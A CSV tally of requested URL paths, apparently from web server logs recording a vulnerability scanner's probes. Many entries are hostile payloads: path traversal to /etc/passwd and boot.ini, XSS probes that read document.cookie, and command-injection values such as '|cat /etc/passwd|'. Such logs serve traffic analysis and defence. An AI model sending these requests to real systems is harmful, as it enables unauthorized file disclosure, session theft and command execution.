Frequency,Resource
1,/cgi-bin/auktion.cgi?menue=../../../../../../../../../../etc/passwd
1,virgil.cgi
1,/TvLBvkHh.asa
2,/upload/bank-icons/bank-gh.jpg
1,/cgi-bin/htmlscript?../../../../../../../../../../etc/passwd
1,/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
1,/servlet/org.apache.catalina.Globals/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/cgi-bin/LWGate
1,"/cgi-bin/FormMail.cgi?<script>alert(\""Vulnerable\"");</script>"
2,/mysql-admin/index.php
1,/TvLBvkHh.asp
1,/index.htm
1,/scripts/tools/dsnform.exe
1,/504/
1,/exchange/lib/logon.inc
1,/phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E
1,/3rdparty/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
1,/logbook.pl?file=../../../../../../../bin/cat%20/etc/passwd%00|
1,/openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;
1,/sip/
1,/mailman/listinfo/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
2,/cgi-bin/cgiwrap/~nuucp
1,/cgi-bin/websendmail
1,/vgn/login
1,/cgi-bin/blog/mt-load.cgi
1,/cgi-bin/talkback.cgi?article=../../../../../../../../etc/passwd%00&action=view&matchview=1
1,/cgi-bin/hsx.cgi?show=../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.cp-1251
1,dansguardian.pl?DENIEDURL=</a><script>alert('Vulnerable');</script>
1,/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>
1,/cgi-bin/pagelog.cgi
1,/cd-cgi/sscd_suncourier.pl
1,/current/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd%00&bn=fm_d1
1,/admin/cplogfile.log
1,icat
1,/nsn/..%5Cutil/lancard.bas
5,/cgi-bin/MsmMask.exe?mask=/junk334
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.thtml
1,perlshop.cgi
1,cgicso?query=AAA
1,/exec/show/config/cr
1,/add.php3?url=ja&adurl=javascript:<script>alert('Vulnerable')</script>
1,/news/news.mdb
1,/webamil/test.php
1,/TvLBvkHh.cgi+
1,/forum/admin/database/wwForum.mdb
1,MsmMask.exe
1,/vgn/legacy/edit
1,/quikstore.cgi
1,//../../../../../../../../../../etc/passwd
1,"/administrator/upload.php?newbanner=1&choice=\""<script>alert(document.cookie)</script>"
1,/vendor/phpunit/phpunit/src/Util/Filter.php
1,/DomainFiles/*//../../../../../../../../../../etc/passwd
1,html2chtml.cgi
1,/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00
1,/TvLBvkHh.nsconfig
1,/netget?sid=user&msg=300&file=../../../../../../../../../boot.ini
1,/cgi/cgiproc
1,/modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script>
1,/bb-dnbd/faxsurvey
1,/wp-includes/js/nri.exe
1,/freefpbf/
1,/clientaccesspolicy.xml
1,/TvLBvkHh.2
1,/TvLBvkHh.1
1,/docs/showtemp.cfm?TYPE=JPEG&FILE=c:\boot.ini
1,"/include.php?path=contact.php&contact_email=\"">&lt;script&gt;alert(document.cookie);&lt;/script&gt;"
1,/cgi-bin/foxweb.exe
1,/TvLBvkHh.*
1,/forums//admin/config.php
1,/typo3conf/database.sql
2,cgiwrap/~ftp
2,/admin/index.php
1,/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef
1,/TvLBvkHh.SHOW
1,/%5BSecCheck%5D/../../ext.ini
1,/signon
1,/index.html.bak
1,diagnose.cgi
1,/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd
1,/cgi-bin/book.cgi?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
4,/robots.txt
1,/cgi-bin/rpm_query
1,/cgi-bin/sewse?/home/httpd/html/sewse/jabber/comment2.jse+/etc/passwd
1,/cgi-bin/snorkerz.cmd
1,commerce.cgi?page=../../../../../../../../../../etc/passwd%00index.html
1,/iisadmin/
1,/cgi-bin/listrec.pl
2,formmail.pl
1,/servlet/com.livesoftware.jrun.plugins.ssi.SSIFilter
1,/TvLBvkHh.shm
1,/TvLBvkHh.c
1,/cgi-bin/cgitest.exe
1,/TvLBvkHh._
1,/global.asa
2,/dbadmin/index.php
1,/html/partner.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>
1,/index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc
1,/cgi-bin/shop.cgi?page=../../../../../../../etc/passwd
1,/nsn/..%5Cutil/slist.bas
1,/cgi-bin/uploader.exe
1,/cgi-bin/com5..........................................................................................................................................................................................................................box
1,/TvLBvkHh.PWD
1,/TvLBvkHh.showsource
1,/cgi-bin/bannereditor.cgi
1,/cgi-bin/html2chtml.cgi
1,/*.*
1,archie
1,/TvLBvkHh.stm
1,/CVS/Entries
1,search
1,/cgi-bin/webspirs.cgi?sp.nextform=../../../../../../../../../../etc/passwd
1,/cgi-bin/generate.cgi?content=../../../../../../../../../../winnt/win.ini%00board=board_1
1,/cgi-bin/LWGate.cgi
1,/firmware/
1,test-env
1,/winbox.png
1,story/story.pl?next=../../../../../../../../../../etc/passwd%00
1,/%3Cscript%3Ealert(%22xss%22)%3C/script%3E/index.html
1,/nsn/..%5Cwebdemo/fdir.bas
1,/IlohaMail/blank.html
1,/cgi-bin/MachineInfo
1,/666%0A%0A%3Cscript%3Ealert('Vulnerable');%3C/script%3E666.jsp
1,start.cgi/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/cgi-bin/whois_raw.cgi?fqdn=%0Acat%20/etc/passwd
1,/autohtml.php?op=modload&mainfile=x&name=/etc/passwd
1,/TvLBvkHh.VALIDATE_STMT
1,/TvLBvkHh.de
2,/cgi-bin/cgiwrap/~nobody
1,/lpt9.xtp
1,/cfdocs/expeval/displayopenedfile.cfm
1,/..%5C..%5C..%5C..%5C..%5C..%5Ctemp%5Ctemp.class
1,/TvLBvkHh.dll
1,/vgn/jsp/metadataupdate
1,/cgi-bin/post-query
1,/cgi-bin/webfind.exe?keywords=01234567890123456789
1,/addressbook/index.php?surname=<script>alert('Vulnerable')</script>
1,/password.inc
5,/phpmyadmin/scripts/_setup.php
1,/cgi-bin/test-cgi.tcl
1,/msadc/samples/adctest.asp
1,SQLServ/sqlbrowse.asp?filepath=c:\&Opt=3
1,/nsn/..%5Cutil/chkvol.bas
1,/TvLBvkHh.cfg
1,/sshome/
1,/pw/storemgr.pw
1,/TvLBvkHh.cfc
1,/TvLBvkHh.cfm
1,/TvLBvkHh.en
1,/cgi-bin/blog/mt.cfg
1,/forums/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,admin.cgi?list=../../../../../../../../../../etc/passwd
1,hsx.cgi?show=../../../../../../../../../../../etc/passwd%00
1,/vgn/jsp/style
1,/cgi-bin/cart32.exe
1,php.cgi?/etc/passwd
1,cgiwrap
